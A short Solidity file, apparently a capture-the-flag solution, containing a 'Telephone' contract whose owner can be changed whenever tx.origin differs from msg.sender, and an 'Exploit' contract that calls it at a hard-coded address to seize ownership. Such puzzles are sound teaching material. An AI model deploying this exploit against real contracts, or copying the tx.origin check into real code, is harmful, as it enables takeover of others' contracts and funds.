// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Exploit {
    function exploit() external  {
        // Calling the changeOwner function from a smart contract will result in the tx.origin being different
        // from the msg sender.
       Telephone(0xC73226508F972C56602fC3A04e3dbc5147DB85dd).changeOwner(msg.sender);
    }
}